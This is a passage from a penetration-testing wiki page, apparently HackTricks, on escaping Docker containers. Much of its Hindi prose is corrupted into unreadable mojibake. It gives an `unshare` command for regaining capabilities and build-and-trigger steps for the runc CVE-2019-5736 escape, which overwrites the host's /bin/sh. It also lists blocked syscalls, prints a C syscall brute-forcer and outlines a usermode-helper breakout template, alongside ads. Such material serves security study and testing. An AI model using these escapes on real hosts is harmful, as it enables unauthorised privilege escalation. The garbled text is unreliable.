* **рдореМрдЬреВрджрд╛ IPC рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** - рдЖрдк `/usr/bin/ipcs` рдХреЗ рд╕рд╛рде рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ IPC рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИрдВред рдЗрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЬрд╛рдВрдЪреЗрдВ: `ipcs -a`

### рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдпрджрд┐ рд╕рд┐рд╕реНрдХреЙрд▓ **`unshare`** рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рд╕рднреА рдХреНрд╖рдорддрд╛рдПрдВ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рд┐рдВрдмрд▓рд┐рдВрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдкреЛрд╕реНрдЯ [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) рдореЗрдВ рд╡рд┐рд╡рд░рдгрд┐рдд рджреВрд╕рд░реА рддрдХрдиреАрдХ рдмрддрд╛рддреА рд╣реИ рдХрд┐ рдЖрдк рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдВрдб рдорд╛рдЙрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рднреАрддрд░ рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрд╕ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдореЗрдВ, рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдЯрд╛ рджреЗрдВ)ред

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛рдПрдВ рдФрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc exploit (CVE-2019-5736)

рдпрджрд┐ рдЖрдк `docker exec` рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╡рддрдГ sudo рдХреЗ рд╕рд╛рде), рддреЛ рдЖрдк CVE-2019-5736 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдХрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ [рдпрд╣рд╛рдВ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go) рд╣реИ)ред рдпрд╣ рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ **рд╣реЛрд╕реНрдЯ** рд╕реЗ **рдХрдВрдЯреЗрдирд░** рдХреЗ _**/bin/sh**_ рдмрд╛рдЗрдирд░реА рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░реЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА docker exec рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкреЗрд▓реЛрдб рдХреЛ рдЕрдиреБрд╕рд╛рд░ рдмрджрд▓реЗрдВ рдФрд░ `go build main.go` рдХреЗ рд╕рд╛рде main.go рдХреЛ рдмрд┐рд▓реНрдб рдХрд░реЗрдВред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдкреА рдмрд╛рдЗрдирд░реА рдХреЛ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди, рдЬреИрд╕реЗ рд╣реА рдпрд╣ `[+] Overwritten /bin/sh successfully` рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

`docker exec -it <container-name> /bin/sh`

рдЗрд╕рд╕реЗ рдореБрдЦреНрдп рдЧреЛ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рдкреЗрд▓реЛрдб рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
рдХрдВрдЯреЗрдирд░ рдХрд┐рд╕реА рдЕрдиреНрдп CVE рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЖрдк [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) рдореЗрдВ рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

* **рдиреЗрдорд╕реНрдкреЗрд╕:** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рд╕реЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрд▓рдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рд╣рдо рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдХрд╛рд░рдг рдЕрдиреНрдп рдкреНрд░реЛрд╕реЗрд╕реЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рд╕реЗ рдмрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ IPC, рдпреВрдирд┐рдХреНрд╕ рд╕реЙрдХреЗрдЯ, рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдПрдВ, D-Bus, рдЕрдиреНрдп рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ `/proc` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ)ред
* **рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛:** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕рдХреА рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЗрдЬрд╝ рд╕реАрдорд┐рдд рд╣реЛрддреА рд╣реИ)ред
* **рдХреНрд╖рдорддрд╛рдПрдБ:** Docker рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╖рдорддрд╛рдПрдВ рдЫреЛрдбрд╝рддрд╛ рд╣реИ: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **рд╕рд┐рд╕рдХреЙрд▓реНрд╕:** рдпреЗ рд╕рд┐рд╕рдХреЙрд▓реНрд╕ рд╡реЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ **рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЙрд▓ рдирд╣реАрдВ рдХрд░ рд╕рдХреЗрдЧрд╛** (рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдХрдореА + рд╕реЗрдХреЙрдореНрдк рдХреЗ рдХрд╛рд░рдг)ред рдмрд╛рдХреА рд╕рд┐рд╕рдХреЙрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рднрд╛рдЧрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% tabs %}
{% tab title="x64 рд╕рд┐рд╕рдХреЙрд▓реНрд╕" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

рдЖрд░реНрдо64 рд╕рд┐рд╕реНрдХреЙрд▓реНрд╕
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
